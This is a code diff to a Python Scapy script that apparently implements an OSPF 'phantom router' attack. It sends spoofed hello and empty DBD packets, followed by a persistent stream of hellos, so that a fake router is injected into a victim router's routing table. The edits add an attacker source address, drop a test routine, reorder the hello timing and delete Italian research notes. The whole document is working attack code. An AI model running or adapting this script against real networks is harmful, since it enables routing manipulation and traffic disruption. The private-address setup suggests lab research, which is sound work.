@@ -16,6 +16,7 @@ from utils import log, log2
 load_contrib("ospf")
 
 
+ATTACKER_SOURCE_ADDRESS = '10.0.3.66'
 SOURCE_ADDRESS = '10.0.1.3'
 DESTINATION_ADDRESS = '10.0.1.2'
 HELLO_DESTINATION_MAC_ADDRESS = '01:00:5e:00:00:05'
@@ -28,24 +29,11 @@ ATTACK_HELLO_INTERVAL = 38
 
 HELLO_INTERVAL = 10
 DEAD_INTERVAL = 40
-TTL = 1 # set to a value greater than 1 in order to be forwarded towards the victim router
+# set TTL to a value greater than 1 in order 
+# for the packet to be forwarded towards the victim router
+TTL = 1 
 
 eight_bit_space = [1L, 2L, 4L, 8L, 16L, 32L, 64L, 128L]
-
-
-def send_empty_ip_packet(iface, srcMAC, dstMAC, srcIP, dstIP, identification_number, ttl):
-	eth_header = Ether(src=srcMAC, dst=dstMAC)
-
-	ip_header = IP(src=srcIP, dst=dstIP, ttl=ttl, proto=89)
-	ip_header.id=identification_number
-	# ip_header.ihl is automatically calculated, as chksum
-	ip_header.tos = 192L
-
-	frame = eth_header/ip_header
-
-	sendp(frame, iface=iface)
-	#frame.show()
-	log('sent empty ip p. (%s)' % identification_number, 'red')
 
 
 def send_hello_packet(iface, srcMAC, dstMAC, srcIP, dstIP, identification_number, ttl):
@@ -116,11 +104,11 @@ def send_empty_dbd_messages(iface, srcMAC, dstMAC, srcIP, dstIP, identification_
 def send_hello_packets(iface, srcMAC, dstMAC, srcIP, dstIP, identification_number, ttl, interval):
 
 	while True:
-		sleep(interval)
-
 		send_hello_packet(iface, srcMAC, dstMAC, srcIP, dstIP, identification_number, ttl)
 
 		identification_number = identification_number + 1
+
+		sleep(interval)
 
 
 def main():
@@ -148,36 +136,30 @@ def main():
 	print 'destination MAC address', dst_mac_address
 	print 'ttl', ttl
 
-	# increased for each IP p. sent
+	# identification_number is increased for each IP p. sent
 	MAX_I_N = 2**15 # Identification Number - 16 bit
 	identification_number = randint(MAX_I_N/4, MAX_I_N*3/4)
 
-	# TEST
-	send_empty_ip_packet(iface, src_mac_address, dst_mac_address, SOURCE_ADDRESS, DESTINATION_ADDRESS, identification_number, ttl)
-
 	# first hello message to let victim know about the phantom router
 	if remote_flag != 1:
-		send_hello_packet(iface, src_mac_address, HELLO_DESTINATION_MAC_ADDRESS, SOURCE_ADDRESS, HELLO_DESTINATION_ADDRESS, identification_number, ttl)
+		send_hello_packet(iface, src_mac_address, HELLO_DESTINATION_MAC_ADDRESS, ATTACKER_SOURCE_ADDRESS, HELLO_DESTINATION_ADDRESS, identification_number, ttl)
 	else:
-		send_hello_packet(iface, src_mac_address, dst_mac_address, SOURCE_ADDRESS, DESTINATION_ADDRESS, identification_number, ttl)
+		send_hello_packet(iface, src_mac_address, dst_mac_address, ATTACKER_SOURCE_ADDRESS, DESTINATION_ADDRESS, identification_number, ttl)
 
 	identification_number = identification_number + 1
 
 	# empty dbd messages to let the victime send over the network its dbd updates
-	send_empty_dbd_messages(iface, src_mac_address, dst_mac_address, SOURCE_ADDRESS, DESTINATION_ADDRESS, identification_number, ttl, ATTACK_DBD_MESSAGES, ATTACK_DBD_INTERVAL)
+	send_empty_dbd_messages(iface, src_mac_address, dst_mac_address, ATTACKER_SOURCE_ADDRESS, DESTINATION_ADDRESS, identification_number, ttl, ATTACK_DBD_MESSAGES, ATTACK_DBD_INTERVAL)
 
 	identification_number = identification_number + ATTACK_DBD_MESSAGES
 
-	# hello pakets to persist the presence of the phantom router
+	# hello pakets to persist the presence of the phantom router 
+	# on the victim router routing table
 	if remote_flag != 1:
-		send_hello_packets(iface, src_mac_address, HELLO_DESTINATION_MAC_ADDRESS, SOURCE_ADDRESS, DESTINATION_ADDRESS, identification_number, ttl, ATTACK_HELLO_INTERVAL)
+		send_hello_packets(iface, src_mac_address, HELLO_DESTINATION_MAC_ADDRESS, ATTACKER_SOURCE_ADDRESS, DESTINATION_ADDRESS, identification_number, ttl, ATTACK_HELLO_INTERVAL)
 	else:
-		send_hello_packets(iface, src_mac_address, dst_mac_address, SOURCE_ADDRESS, DESTINATION_ADDRESS, identification_number, ttl, ATTACK_HELLO_INTERVAL)
+		send_hello_packets(iface, src_mac_address, dst_mac_address, ATTACKER_SOURCE_ADDRESS, DESTINATION_ADDRESS, identification_number, ttl, ATTACK_HELLO_INTERVAL)
 
-	# TODO controlla se il secondo Hello p. va inviato dopo 40 s dal precedente o dopo 40 s dall'ultimo p. inviato
-
-	# TODO crea un pacchetto vuoto a livello di payload IP e verifica se viene inoltrato da R3
-	# RESULT: il p. vuoto non viene inoltrato, è possibile che R3 controllando IP.proto lo scarti
 
 if __name__ == "__main__":
 	main()
